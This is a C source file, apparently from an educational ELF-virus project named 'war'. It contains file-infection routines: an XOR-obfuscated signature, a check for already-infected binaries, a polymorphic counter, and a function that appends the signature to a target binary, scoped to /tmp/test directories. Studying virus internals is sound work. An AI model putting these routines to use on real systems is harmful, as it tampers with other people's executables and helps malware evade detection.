#define _GNU_SOURCE

#include "../incl/war.h"

static unsigned char g_signature[] = {
    0x15, 0x23, 0x30, 0x62, 0x34, 0x27, 0x30, 0x31,
    0x2b, 0x2d, 0x2c, 0x62, 0x73, 0x6c, 0x72, 0x62,
    0x6a, 0x21, 0x6b, 0x2d, 0x26, 0x27, 0x26, 0x62,
    0x0d, 0x21, 0x36, 0x62, 0x6f, 0x62, 0x70, 0x72,
    0x70, 0x74, 0x62, 0x20, 0x3b, 0x62, 0x26, 0x23,
    0x34, 0x25, 0x23, 0x2e, 0x2e, 0x27, 0x62, 0x6f,
    0x62, 0x10, 0x0c, 0x01, 0x12, 0x71, 0x7b, 0x75,
    0x75, 0x76, 0x00
};

void    ft_polymorphism(t_war *war)
{
    char    *buffer;
    char    *aux = war->signd;
    int     i = 0;
    int     value = 0;
    int     len = ft_couter(war->signd) + 1;

    buffer = malloc(len);
    if (!buffer)
        return;
    while (aux[i] != '\0')
    {
        if (aux[i] == 'P')
        {
            i++;
            while (aux[i] != '\0')
            {
                buffer[value] = aux[i]; 
                value++;
                i++;
            }
            buffer[value] = '\0';
        }
        if (aux[i] != '\0') 
            i++;
    }
    value = 0;
    value = atoi(buffer);
    value++;
    snprintf(buffer, len, "%05d", value);
    ft_update_payload(war, buffer);
    free(buffer);
}

char    *ft_getdir(int i)
{
    if (i == 0)
        return ("/tmp/test");
    return ("/tmp/test2");
}

int     ft_is_infection(t_war *war)
{
    ft_obfuscation(war);
    war->signd = memmem(war->elf, war->file_size, war->decrypted, strlen(war->decrypted));
    if (war->signd)
    {
        ft_polymorphism(war);
        return (1);
    }
    return (0);
}

void    ft_infect(t_war *war)
{
    munmap(war->elf, war->file_size);
    close(war->fd);
    war->fd = open(war->binary, O_WRONLY | O_NOFOLLOW);
    lseek(war->fd, 0, SEEK_END);
    write(war->fd, war->decrypted, strlen(war->decrypted));
    close(war->fd);
    return;
}

void    ft_obfuscation(t_war *war)
{
    int i = 0;
    while (g_signature[i])
    {
        war->decrypted[i] = g_signature[i] ^ KEY;
        i++;
    }
    war->decrypted[i] = '\0';
}